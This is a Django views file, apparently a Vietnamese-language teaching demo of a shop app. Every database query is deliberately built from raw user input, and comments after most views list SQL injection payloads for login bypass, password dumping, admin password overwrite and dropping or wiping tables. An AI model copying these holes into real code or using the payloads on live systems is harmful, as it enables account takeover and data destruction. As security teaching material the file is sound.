from django.shortcuts import render, redirect
from django.db import connection
from .models import User, Product, Order, Comment, Category
from datetime import datetime

def login_view(request):
    """
    Đăng nhập tài khoản.
    """
    message = ''
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')

        with connection.cursor() as cursor:
            query = f"SELECT * FROM loginapp_user WHERE username = '{username}' AND password = '{password}'"
            cursor.execute(query)
            row = cursor.fetchone()

            if row:
                # Sử dụng hàm chuyển đổi để lấy dữ liệu dưới dạng dictionary
                user = tuple_to_dict(cursor, row)
                request.session['user_id'] = user['id']
                request.session['username'] = user['username']
                message = f"Đăng nhập thành công! Xin chào, {user['username']}."
                return redirect('/products')
            else:
                message = "Sai tài khoản hoặc mật khẩu."
    return render(request, 'login.html', {'message': message})
# ' or 1 = 1;--

def register_view(request):
    """
    Đăng ký tài khoản.
    """
    message = ''
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')

        # ❌ Cố tình không an toàn để minh hoạ SQL Injection
        with connection.cursor() as cursor:
            query = f"INSERT INTO loginapp_user (username, password) VALUES ('{username}', '{password}')"
            cursor.execute(query)
            message = "Đăng ký thành công!"
        return redirect('/')
    return render(request, 'register.html', {'message': message})
# admin', 'newpass') ON CONFLICT(username) DO UPDATE SET password = 'newpass';

def update_password_view(request):
    """
    Cập nhật mật khẩu.
    """
    message = ''
    if request.method == 'POST':
        username = request.POST.get('username')
        new_password = request.POST.get('new_password')

        # ❌ Không an toàn, dễ bị SQL Injection
        with connection.cursor() as cursor:
            try:
                query = f"UPDATE loginapp_user SET password = '{new_password}' WHERE username = '{username}'"
                cursor.executescript(query)
                message = "Cập nhật mật khẩu thành công!"
            except Exception as e:
                message = f"Lỗi: {str(e)}"
        return redirect('/')
    return render(request, 'updatePassword.html', {'message': message})
# username: ' OR 1=1; UPDATE loginapp_product SET price = 2000 WHERE 1=1; --
# new_password: hacked
#-----------------------
# username: ' OR 1=1; DROP TABLE loginapp_comment; --
# new_password: hacked
#-----------------------
# username: ' OR 1=1; DELETE FROM loginapp_comment; --
# new_password: hacked
#-----------------------
# username: ' OR 1=1; DELETE FROM loginapp_category_products; --
# new_password: hacked
#-----------------------
# username: ' OR 1=1; DELETE FROM loginapp_product; --
# new_password: hacked
#
# Xoá bảng có Foreign key

def search(request):
    """
    Tìm kiếm tài khoản.
    """
    keyword = request.GET.get('q')
    cursor = connection.cursor()
    query = f"SELECT username FROM loginapp_user WHERE username LIKE '%{keyword}%'"
    cursor.execute(query)
    rows = cursor.fetchall()

    # Chuyển đổi từng kết quả thành dictionary
    results = [tuple_to_dict(cursor, row) for row in rows]

    return render(request, 'search.html', {'results': results})
# %' UNION SELECT CONCAT_WS(', ', password, username) as username FROM loginapp_user --

def tuple_to_dict(cursor, row):
    """
    Chuyển đổi kết quả từ tuple thành dictionary với tên cột làm khóa.
    """
    if row is None:
        return None
    return dict(zip([col[0] for col in cursor.description], row))

def product_list(request):
    """
    Hiển thị danh sách sản phẩm.
    """
    search = request.GET.get('q', '')
    with connection.cursor() as cursor:
        if search:
            query = f"SELECT * FROM loginapp_product WHERE name LIKE '%{search}%'"
        else:
            query = "SELECT * FROM loginapp_product"
        cursor.execute(query)
        products = cursor.fetchall()
        products = [tuple_to_dict(cursor, product) for product in products]
    return render(request, 'product_list.html', {'products': products, 'search': search})
# ' UNION SELECT name, NULL, NULL, NULL , NULL, NULL, NULL  FROM sqlite_master WHERE type='table' --
# Làm lộ tên các bảng trong db

def product_detail(request, product_id):
    """
    Hiển thị chi tiết sản phẩm.
    """
    with connection.cursor() as cursor:
        # Lấy thông tin sản phẩm
        query = f"SELECT * FROM loginapp_product WHERE id = {product_id}"
        cursor.execute(query)
        product = cursor.fetchone()
        
        # Lấy comments
        query = f"SELECT * FROM loginapp_comment WHERE product_id = {product_id}"
        cursor.execute(query)
        comments = cursor.fetchall()
    
    return render(request, 'product_detail.html', {
        'product': tuple_to_dict(cursor, product),
        'comments': [tuple_to_dict(cursor, comment) for comment in comments]
    })

def create_order(request):
    """
    Tạo đơn hàng.
    """
    if request.method == 'POST':
        user_id = request.session.get('user_id')
        product_id = request.POST.get('product_id')
        quantity = request.POST.get('quantity')
        created_at = datetime.now()
        
        with connection.cursor() as cursor:
            # Lấy giá sản phẩm
            query = f"SELECT price FROM loginapp_product WHERE id = {product_id}"
            cursor.execute(query)
            price = cursor.fetchone()[0]
            
            # Tạo đơn hàng
            total_price = float(price) * int(quantity)
            query = f"""
                INSERT INTO loginapp_order (user_id, product_id, quantity, total_price, status, created_at)
                VALUES ({user_id}, {product_id}, {quantity}, {total_price}, 'pending', '{created_at}')
            """
            cursor.execute(query)
        
        return redirect('/orders')
    return render(request, 'create_order.html')

def order_list(request):
    """
    Hiển thị danh sách đơn hàng.
    """
    user_id = request.GET.get('user_id')
    with connection.cursor() as cursor:
        if user_id:
            query = f"""
                SELECT o.*, p.name as product_name, u.username 
                FROM loginapp_order o
                JOIN loginapp_product p ON o.product_id = p.id
                JOIN loginapp_user u ON o.user_id = u.id
                WHERE o.user_id = {user_id}
            """
        else:
            query = """
                SELECT o.*, p.name as product_name, u.username 
                FROM loginapp_order o
                JOIN loginapp_product p ON o.product_id = p.id
                JOIN loginapp_user u ON o.user_id = u.id
            """
        cursor.execute(query)
        orders = cursor.fetchall()
    return render(request, 'order_list.html', {'orders': [tuple_to_dict(cursor, order) for order in orders]})

def add_comment(request):
    """
    Thêm bình luận vào sản phẩm.
    """
    if request.method == 'POST':
        user_id = request.session.get('user_id')
        product_id = request.POST.get('product_id')
        content = request.POST.get('content')
        rating = request.POST.get('rating')
        created_at = datetime.now()

        with connection.cursor() as cursor:
            query = f"""
                INSERT INTO loginapp_comment (user_id, product_id, content, rating, created_at)
                VALUES ({user_id}, {product_id}, '{content}', {rating}, '{created_at}')
            """
            print(query)
            cursor.executescript(query)
        
        return redirect(f'/product/{product_id}')
    return render(request, 'add_comment.html')
# hacked', 5, ''); DROP TABLE loginapp_comment; --
# hacked', 5, ''); DELETE FROM loginapp_product; --
# hacked', 5, ''); UPDATE loginapp_product SET price = 1000 WHERE 1=1; --
# Thay đổi và xoá table